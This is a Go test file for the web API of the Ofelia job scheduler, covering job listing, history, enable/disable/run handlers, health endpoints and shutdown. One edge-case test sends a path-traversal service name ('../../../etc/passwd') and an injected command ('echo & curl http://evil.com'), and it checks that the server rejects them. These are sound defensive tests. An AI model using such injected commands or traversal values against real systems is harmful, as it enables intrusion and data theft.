package web_test

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/netresearch/ofelia/cli"
	"github.com/netresearch/ofelia/core"
	webpkg "github.com/netresearch/ofelia/web"
)

const (
	schedDaily   = "@daily"
	schedHourly  = "@hourly"
	cmdEcho      = "echo"
	nameJobINI   = "job-ini"
	nameJobLabel = "job-label"
	originINI    = "ini"
	originLabel  = "label"
)

func stubDiscardLogger() *slog.Logger {
	return slog.New(slog.DiscardHandler)
}

type testJob struct{ core.BareJob }

func (j *testJob) Run(*core.Context) error { return nil }

type apiExecution struct {
	Date     time.Time     `json:"date"`
	Duration time.Duration `json:"duration"`
	Failed   bool          `json:"failed"`
	Skipped  bool          `json:"skipped"`
	Error    string        `json:"error"`
	Stdout   string        `json:"stdout"`
	Stderr   string        `json:"stderr"`
}

type apiJob struct {
	Name     string          `json:"name"`
	Type     string          `json:"type"`
	Schedule string          `json:"schedule"`
	Command  string          `json:"command"`
	Running  bool            `json:"running"`
	LastRun  *apiExecution   `json:"lastRun"`
	NextRuns []time.Time     `json:"nextRuns"`
	PrevRuns []time.Time     `json:"prevRuns"`
	Origin   string          `json:"origin"`
	Config   json.RawMessage `json:"config"`
}

func TestHistoryEndpoint(t *testing.T) {
	job := &testJob{}
	job.Name = "job1"
	const (
		schedDaily   = "@daily"
		schedHourly  = "@hourly"
		cmdEcho      = "echo"
		nameJobINI   = "job-ini"
		nameJobLabel = "job-label"
		originINI    = "ini"
	)
	job.Schedule = schedDaily
	job.Command = cmdEcho
	e, _ := core.NewExecution()
	_, _ = e.OutputStream.Write([]byte("out"))
	_, _ = e.ErrorStream.Write([]byte("err"))
	e.Error = fmt.Errorf("boom")
	e.Failed = true
	job.SetLastRun(e)
	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: stubDiscardLogger()}
	srv := webpkg.NewServer("", sched, nil, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs/job1/history", nil)
	w := httptest.NewRecorder()
	httpSrv := srv.HTTPServer()
	httpSrv.Handler.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("unexpected status %d", w.Code)
	}
	var data []apiExecution
	if err := json.NewDecoder(w.Body).Decode(&data); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(data) != 1 {
		t.Fatalf("expected 1 entry, got %d", len(data))
	}
	if data[0].Stdout != "out" || data[0].Stderr != "err" || data[0].Error != "boom" {
		t.Fatalf("unexpected output %v", data[0])
	}
}

func TestJobsEndpointWithRuntimeData(t *testing.T) {
	// Create test job with execution output
	job := &testJob{}
	job.Name = "test-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho

	// Create execution with output
	e, err := core.NewExecution()
	if err != nil {
		t.Fatalf("NewExecution error: %v", err)
	}

	// Write test data to buffers
	stdoutData := "job completed successfully"
	stderrData := "warning: deprecated flag used"

	_, err = e.OutputStream.Write([]byte(stdoutData))
	if err != nil {
		t.Fatalf("Write stdout error: %v", err)
	}

	_, err = e.ErrorStream.Write([]byte(stderrData))
	if err != nil {
		t.Fatalf("Write stderr error: %v", err)
	}

	e.Start()
	time.Sleep(1 * time.Millisecond) // Ensure duration > 0
	e.Stop(nil)                      // Success

	job.SetLastRun(e)

	// Create scheduler and server
	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: stubDiscardLogger()}
	srv := webpkg.NewServer("", sched, nil, nil)

	// Test with live buffers
	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}

	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	job1 := jobs[0]
	if job1.LastRun == nil {
		t.Fatal("expected LastRun to be set")
	}

	// Verify runtime data is present
	if job1.LastRun.Stdout != stdoutData {
		t.Errorf("LastRun.Stdout = %q, want %q", job1.LastRun.Stdout, stdoutData)
	}
	if job1.LastRun.Stderr != stderrData {
		t.Errorf("LastRun.Stderr = %q, want %q", job1.LastRun.Stderr, stderrData)
	}
	if job1.LastRun.Duration <= 0 {
		t.Errorf("LastRun.Duration = %v, want > 0", job1.LastRun.Duration)
	}
	if job1.LastRun.Date.IsZero() {
		t.Error("LastRun.Date should not be zero")
	}
	if job1.LastRun.Failed {
		t.Error("LastRun.Failed should be false for successful execution")
	}
}

func TestJobsEndpointAfterBufferCleanup(t *testing.T) {
	// Create test job with execution output
	job := &testJob{}
	job.Name = "cleaned-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho

	// Create execution with output
	e, err := core.NewExecution()
	if err != nil {
		t.Fatalf("NewExecution error: %v", err)
	}

	// Write test data to buffers
	stdoutData := "cleanup test output"
	stderrData := "cleanup test error"

	_, err = e.OutputStream.Write([]byte(stdoutData))
	if err != nil {
		t.Fatalf("Write stdout error: %v", err)
	}

	_, err = e.ErrorStream.Write([]byte(stderrData))
	if err != nil {
		t.Fatalf("Write stderr error: %v", err)
	}

	e.Start()
	time.Sleep(1 * time.Millisecond) // Ensure duration > 0
	e.Stop(nil)                      // Success

	// Cleanup buffers to simulate real-world scenario
	e.Cleanup()

	job.SetLastRun(e)

	// Create scheduler and server
	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: stubDiscardLogger()}
	srv := webpkg.NewServer("", sched, nil, nil)

	// Test with cleaned buffers (should use captured content)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}

	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	job1 := jobs[0]
	if job1.LastRun == nil {
		t.Fatal("expected LastRun to be set")
	}

	// Verify runtime data is still available after cleanup
	if job1.LastRun.Stdout != stdoutData {
		t.Errorf("LastRun.Stdout after cleanup = %q, want %q", job1.LastRun.Stdout, stdoutData)
	}
	if job1.LastRun.Stderr != stderrData {
		t.Errorf("LastRun.Stderr after cleanup = %q, want %q", job1.LastRun.Stderr, stderrData)
	}
	if job1.LastRun.Duration <= 0 {
		t.Errorf("LastRun.Duration = %v, want > 0", job1.LastRun.Duration)
	}
}

func TestHistoryEndpointWithCapturedOutput(t *testing.T) {
	job := &testJob{}
	job.Name = "history-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho

	// Create execution with output that will be cleaned up
	e, err := core.NewExecution()
	if err != nil {
		t.Fatalf("NewExecution error: %v", err)
	}

	historyStdout := "historical output"
	historyStderr := "historical error"

	_, err = e.OutputStream.Write([]byte(historyStdout))
	if err != nil {
		t.Fatalf("Write stdout error: %v", err)
	}

	_, err = e.ErrorStream.Write([]byte(historyStderr))
	if err != nil {
		t.Fatalf("Write stderr error: %v", err)
	}

	e.Start()
	time.Sleep(1 * time.Millisecond)
	e.Stop(fmt.Errorf("test error"))

	// Cleanup to simulate buffer pool return
	e.Cleanup()

	job.SetLastRun(e)
	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: stubDiscardLogger()}
	srv := webpkg.NewServer("", sched, nil, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs/history-job/history", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var history []apiExecution
	if err := json.Unmarshal(rr.Body.Bytes(), &history); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}

	if len(history) != 1 {
		t.Fatalf("expected 1 execution in history, got %d", len(history))
	}

	exec := history[0]

	// Verify captured output is available in history
	if exec.Stdout != historyStdout {
		t.Errorf("History Stdout = %q, want %q", exec.Stdout, historyStdout)
	}
	if exec.Stderr != historyStderr {
		t.Errorf("History Stderr = %q, want %q", exec.Stderr, historyStderr)
	}
	if !exec.Failed {
		t.Error("Execution should be marked as failed")
	}
	if exec.Error != "test error" {
		t.Errorf("Error = %q, want %q", exec.Error, "test error")
	}
}

func TestJobsHandlerIncludesOutput(t *testing.T) {
	job := &testJob{}
	job.Name = "job1"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	e, _ := core.NewExecution()
	_, _ = e.OutputStream.Write([]byte("out"))
	_, _ = e.ErrorStream.Write([]byte("err"))
	e.Error = fmt.Errorf("boom")
	e.Failed = true
	job.SetLastRun(e)
	sched := &core.Scheduler{Jobs: []core.Job{job}, Logger: stubDiscardLogger()}
	srv := webpkg.NewServer("", sched, nil, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	w := httptest.NewRecorder()
	httpSrv := srv.HTTPServer()
	httpSrv.Handler.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("unexpected status %d", w.Code)
	}
	var jobs []apiJob
	if err := json.NewDecoder(w.Body).Decode(&jobs); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(jobs) != 1 || jobs[0].LastRun == nil {
		t.Fatalf("unexpected jobs %v", jobs)
	}
	if jobs[0].LastRun.Stdout != "out" || jobs[0].LastRun.Stderr != "err" || jobs[0].LastRun.Error != "boom" {
		t.Fatalf("stdout/stderr/error not included")
	}
}

func TestJobsHandlerOrigin(t *testing.T) {
	jobIni := &testJob{}
	jobIni.Name = nameJobINI
	jobIni.Schedule = schedDaily
	jobIni.Command = cmdEcho

	jobLabel := &testJob{}
	jobLabel.Name = nameJobLabel
	jobLabel.Schedule = schedHourly
	jobLabel.Command = "ls"

	sched := &core.Scheduler{Jobs: []core.Job{jobIni, jobLabel}, Logger: stubDiscardLogger()}

	type originConfig struct {
		RunJobs map[string]*struct{ JobSource cli.JobSource }
	}
	cfg := &originConfig{
		RunJobs: map[string]*struct{ JobSource cli.JobSource }{
			"job-ini":   {JobSource: cli.JobSourceINI},
			"job-label": {JobSource: cli.JobSourceLabel},
		},
	}

	srv := webpkg.NewServer("", sched, cfg, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	w := httptest.NewRecorder()
	httpSrv := srv.HTTPServer()
	httpSrv.Handler.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("unexpected status %d", w.Code)
	}

	var jobs []apiJob
	if err := json.NewDecoder(w.Body).Decode(&jobs); err != nil {
		t.Fatalf("decode: %v", err)
	}

	if len(jobs) != 2 {
		t.Fatalf("expected 2 jobs")
	}

	m := map[string]string{}
	for _, j := range jobs {
		m[j.Name] = j.Origin
	}

	if m[nameJobINI] != originINI || m[nameJobLabel] != originLabel {
		t.Fatalf("unexpected origins %v", m)
	}
}

func TestRemovedJobsHandlerOrigin(t *testing.T) {
	jobIni := &testJob{}
	jobIni.Name = nameJobINI
	jobIni.Schedule = schedDaily
	jobIni.Command = cmdEcho

	jobLabel := &testJob{}
	jobLabel.Name = nameJobLabel
	jobLabel.Schedule = schedHourly
	jobLabel.Command = "ls"

	sched := core.NewScheduler(stubDiscardLogger())
	_ = sched.AddJob(jobIni)
	_ = sched.AddJob(jobLabel)
	_ = sched.RemoveJob(jobIni)
	_ = sched.RemoveJob(jobLabel)

	type originConfig struct {
		RunJobs map[string]*struct{ JobSource cli.JobSource }
	}
	cfg := &originConfig{
		RunJobs: map[string]*struct{ JobSource cli.JobSource }{
			"job-ini":   {JobSource: cli.JobSourceINI},
			"job-label": {JobSource: cli.JobSourceLabel},
		},
	}

	srv := webpkg.NewServer("", sched, cfg, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs/removed", nil)
	w := httptest.NewRecorder()
	httpSrv := srv.HTTPServer()
	httpSrv.Handler.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("unexpected status %d", w.Code)
	}

	var jobs []apiJob
	if err := json.NewDecoder(w.Body).Decode(&jobs); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(jobs) != 2 {
		t.Fatalf("expected 2 jobs, got %d", len(jobs))
	}
	m := map[string]string{}
	for _, j := range jobs {
		m[j.Name] = j.Origin
	}
	if m[nameJobINI] != originINI || m[nameJobLabel] != originLabel {
		t.Fatalf("unexpected origins %v", m)
	}
}

func TestDisabledJobsHandlerOrigin(t *testing.T) {
	jobIni := &testJob{}
	jobIni.Name = nameJobINI
	jobIni.Schedule = schedDaily
	jobIni.Command = cmdEcho

	jobLabel := &testJob{}
	jobLabel.Name = nameJobLabel
	jobLabel.Schedule = schedHourly
	jobLabel.Command = "ls"

	sched := core.NewScheduler(stubDiscardLogger())
	_ = sched.AddJob(jobIni)
	_ = sched.AddJob(jobLabel)
	_ = sched.DisableJob("job-ini")
	_ = sched.DisableJob("job-label")

	type originConfig struct {
		RunJobs map[string]*struct{ JobSource cli.JobSource }
	}
	cfg := &originConfig{
		RunJobs: map[string]*struct{ JobSource cli.JobSource }{
			"job-ini":   {JobSource: cli.JobSourceINI},
			"job-label": {JobSource: cli.JobSourceLabel},
		},
	}

	srv := webpkg.NewServer("", sched, cfg, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/jobs/disabled", nil)
	w := httptest.NewRecorder()
	httpSrv := srv.HTTPServer()
	httpSrv.Handler.ServeHTTP(w, req)
	if w.Code != 200 {
		t.Fatalf("unexpected status %d", w.Code)
	}

	var jobs []apiJob
	if err := json.NewDecoder(w.Body).Decode(&jobs); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if len(jobs) != 2 {
		t.Fatalf("expected 2 jobs, got %d", len(jobs))
	}
	m := map[string]string{}
	for _, j := range jobs {
		m[j.Name] = j.Origin
	}
	if m[nameJobINI] != originINI || m[nameJobLabel] != originLabel {
		t.Fatalf("unexpected origins %v", m)
	}
}

func TestCreateJobTypes(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	cases := []struct {
		name   string
		body   string
		status int
		check  func(core.Job) bool
	}{
		{"run1", `{"name":"run1","type":"run","schedule":"@hourly","image":"busybox"}`, http.StatusBadRequest, func(j core.Job) bool { return j == nil }},
		{"exec1", `{"name":"exec1","type":"exec","schedule":"@hourly","container":"c1"}`, http.StatusBadRequest, func(j core.Job) bool { return j == nil }},
		{"comp1", `{"name":"comp1","type":"compose","schedule":"@hourly","service":"db"}`, http.StatusCreated, func(j core.Job) bool { _, ok := j.(*core.ComposeJob); return ok }},
		{"local1", `{"name":"local1","type":"local","schedule":"@hourly"}`, http.StatusCreated, func(j core.Job) bool { _, ok := j.(*core.LocalJob); return ok }},
	}

	for _, c := range cases {
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(c.body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)
		if w.Code != c.status {
			t.Fatalf("%s: unexpected status %d", c.name, w.Code)
		}
		j := sched.GetJob(c.name)
		if !c.check(j) {
			t.Fatalf("%s: job check failed: %T", c.name, j)
		}
		if j != nil {
			_ = sched.RemoveJob(j)
		}
	}
}

// New tests for missing coverage

func TestRunJobHandler(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	job := &testJob{}
	job.Name = "test-run-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	_ = sched.AddJob(job)
	_ = sched.Start() // Start the scheduler to initialize workflow orchestrator

	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	t.Run("success", func(t *testing.T) {
		body := `{"name":"test-run-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusNoContent {
			t.Errorf("expected status 204, got %d", w.Code)
		}
	})

	t.Run("invalid_json", func(t *testing.T) {
		body := `{invalid json}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})

	t.Run("job_not_found", func(t *testing.T) {
		body := `{"name":"nonexistent-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/run", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})
}

func TestDisableJobHandler(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	job := &testJob{}
	job.Name = "test-disable-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	_ = sched.AddJob(job)

	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	t.Run("success", func(t *testing.T) {
		body := `{"name":"test-disable-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusNoContent {
			t.Errorf("expected status 204, got %d", w.Code)
		}

		// Verify job is disabled
		disabled := sched.GetDisabledJobs()
		if len(disabled) != 1 {
			t.Errorf("expected 1 disabled job, got %d", len(disabled))
		}
	})

	t.Run("invalid_json", func(t *testing.T) {
		body := `{invalid}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})

	t.Run("job_not_found", func(t *testing.T) {
		body := `{"name":"nonexistent-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/disable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})
}

func TestEnableJobHandler(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	job := &testJob{}
	job.Name = "test-enable-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	_ = sched.AddJob(job)
	_ = sched.DisableJob("test-enable-job")

	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	t.Run("success", func(t *testing.T) {
		body := `{"name":"test-enable-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusNoContent {
			t.Errorf("expected status 204, got %d", w.Code)
		}

		// Verify job is enabled
		if sched.GetJob("test-enable-job") == nil {
			t.Error("job should be enabled")
		}
	})

	t.Run("invalid_json", func(t *testing.T) {
		body := `{bad json}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})

	t.Run("job_not_found", func(t *testing.T) {
		body := `{"name":"nonexistent-job"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/enable", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})
}

func TestHistoryHandler_NotFound(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	t.Run("job_not_found", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/jobs/nonexistent/history", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
			t.Errorf("expected status 404, got %d", w.Code)
		}
	})

	t.Run("invalid_path", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/api/jobs/test-job/invalid", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusNotFound {
			t.Errorf("expected status 404, got %d", w.Code)
		}
	})
}

func TestShutdown(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer(":0", sched, nil, nil)

	// Start the server
	err := srv.Start()
	if err != nil {
		t.Fatalf("failed to start server: %v", err)
	}

	// Give it a moment to start
	time.Sleep(10 * time.Millisecond)

	// Test shutdown
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	err = srv.Shutdown(ctx)
	if err != nil {
		t.Errorf("shutdown failed: %v", err)
	}
}

func TestRegisterHealthEndpoints(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer("", sched, nil, nil)

	hc := webpkg.NewHealthChecker(nil, "test-version")
	// Give the health checker time to run initial checks
	time.Sleep(50 * time.Millisecond)

	srv.RegisterHealthEndpoints(hc)

	httpSrv := srv.HTTPServer()

	t.Run("health_endpoint", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/health", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("expected status 200, got %d", w.Code)
		}

		var response map[string]any
		if err := json.NewDecoder(w.Body).Decode(&response); err != nil {
			t.Fatalf("failed to decode response: %v", err)
		}

		if response["version"] != "test-version" {
			t.Errorf("expected version 'test-version', got %v", response["version"])
		}
	})

	t.Run("healthz_endpoint", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/healthz", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("expected status 200, got %d", w.Code)
		}
	})

	t.Run("ready_endpoint", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/ready", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		// Ready endpoint returns 503 if Docker is unhealthy, which is expected without Docker provider
		if w.Code != http.StatusServiceUnavailable && w.Code != http.StatusOK {
			t.Errorf("expected status 200 or 503, got %d", w.Code)
		}
	})

	t.Run("live_endpoint", func(t *testing.T) {
		req := httptest.NewRequest(http.MethodGet, "/live", nil)
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("expected status 200, got %d", w.Code)
		}

		body := w.Body.String()
		if body != "OK" {
			t.Errorf("expected body 'OK', got %q", body)
		}
	})
}

func TestJobFromRequest_EdgeCases(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer("", sched, nil, nil)
	httpSrv := srv.HTTPServer()

	t.Run("unknown_job_type", func(t *testing.T) {
		body := `{"name":"test","type":"unknown","schedule":"@hourly"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400, got %d", w.Code)
		}
	})

	t.Run("empty_type_creates_local", func(t *testing.T) {
		body := `{"name":"empty-type","type":"","schedule":"@hourly","command":"echo test"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusCreated {
			t.Errorf("expected status 201, got %d", w.Code)
		}

		job := sched.GetJob("empty-type")
		if job == nil {
			t.Fatal("expected job to be created")
		}
		if _, ok := job.(*core.LocalJob); !ok {
			t.Errorf("expected LocalJob, got %T", job)
		}
	})

	t.Run("compose_invalid_service", func(t *testing.T) {
		body := `{"name":"comp-invalid","type":"compose","schedule":"@hourly","service":"../../../etc/passwd"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400 for invalid service, got %d", w.Code)
		}
	})

	t.Run("local_invalid_command", func(t *testing.T) {
		body := `{"name":"local-invalid","type":"local","schedule":"@hourly","command":"echo & curl http://evil.com"}`
		req := httptest.NewRequest(http.MethodPost, "/api/jobs/create", strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		httpSrv.Handler.ServeHTTP(w, req)

		if w.Code != http.StatusBadRequest {
			t.Errorf("expected status 400 for invalid command, got %d", w.Code)
		}
	})
}

func TestGetHTTPServer(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())
	srv := webpkg.NewServer("", sched, nil, nil)

	httpSrv := srv.GetHTTPServer()
	if httpSrv == nil {
		t.Error("GetHTTPServer() should return non-nil server")
	}

	// Verify it's the same as HTTPServer()
	if httpSrv != srv.HTTPServer() {
		t.Error("GetHTTPServer() and HTTPServer() should return the same instance")
	}
}

func TestJobsEndpointNextPrevRuns(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())

	// Add a job with a real cron schedule so NextN/PrevN return results
	job := &testJob{}
	job.Name = "cron-job"
	job.Schedule = "*/5 * * * *" // every 5 minutes
	job.Command = "echo hello"
	if err := sched.AddJob(job); err != nil {
		t.Fatalf("AddJob error: %v", err)
	}

	srv := webpkg.NewServer("", sched, nil, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}
	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	j := jobs[0]

	// NextRuns should have 5 entries for a valid cron schedule
	if len(j.NextRuns) != 5 {
		t.Errorf("expected 5 next_runs, got %d", len(j.NextRuns))
	}
	// PrevRuns should have 5 entries for a valid cron schedule
	if len(j.PrevRuns) != 5 {
		t.Errorf("expected 5 prev_runs, got %d", len(j.PrevRuns))
	}

	// NextRuns should be in ascending chronological order
	now := time.Now()
	for i, ts := range j.NextRuns {
		if !ts.After(now) {
			t.Errorf("next_runs[%d] = %v should be after now %v", i, ts, now)
		}
		if i > 0 && !ts.After(j.NextRuns[i-1]) {
			t.Errorf("next_runs[%d] = %v should be after next_runs[%d] = %v", i, ts, i-1, j.NextRuns[i-1])
		}
	}

	// PrevRuns should be in reverse chronological order (most recent first)
	for i, ts := range j.PrevRuns {
		if !ts.Before(now) {
			t.Errorf("prev_runs[%d] = %v should be before now %v", i, ts, now)
		}
		if i > 0 && !ts.Before(j.PrevRuns[i-1]) {
			t.Errorf("prev_runs[%d] = %v should be before prev_runs[%d] = %v", i, ts, i-1, j.PrevRuns[i-1])
		}
	}
}

func TestJobsEndpointTriggeredJobEmptyRuns(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())

	// Add a triggered-only job (no cron schedule)
	job := &testJob{}
	job.Name = "triggered-job"
	job.Schedule = "@triggered"
	job.Command = "echo triggered"
	if err := sched.AddJob(job); err != nil {
		t.Fatalf("AddJob error: %v", err)
	}

	srv := webpkg.NewServer("", sched, nil, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
	if err := json.Unmarshal(rr.Body.Bytes(), &jobs); err != nil {
		t.Fatalf("json unmarshal error: %v", err)
	}
	if len(jobs) != 1 {
		t.Fatalf("expected 1 job, got %d", len(jobs))
	}

	j := jobs[0]

	// Triggered jobs should have empty (non-nil) slices
	if j.NextRuns == nil {
		t.Error("next_runs should be non-nil empty slice")
	}
	if j.PrevRuns == nil {
		t.Error("prev_runs should be non-nil empty slice")
	}
	if len(j.NextRuns) != 0 {
		t.Errorf("expected 0 next_runs for triggered job, got %d", len(j.NextRuns))
	}
	if len(j.PrevRuns) != 0 {
		t.Errorf("expected 0 prev_runs for triggered job, got %d", len(j.PrevRuns))
	}
}

func TestDisabledJobsEndpointEmptyRuns(t *testing.T) {
	sched := core.NewScheduler(stubDiscardLogger())

	job := &testJob{}
	job.Name = "disabled-job"
	job.Schedule = schedDaily
	job.Command = cmdEcho
	_ = sched.AddJob(job)
	_ = sched.DisableJob("disabled-job")

	srv := webpkg.NewServer("", sched, nil, nil)
	req := httptest.NewRequest(http.MethodGet, "/api/jobs/disabled", nil)
	rr := httptest.NewRecorder()
	srv.HTTPServer().Handler.ServeHTTP(rr, req)

	if rr.Code != http.StatusOK {
		t.Fatalf("expected status 200, got %d", rr.Code)
	}

	var jobs []apiJob
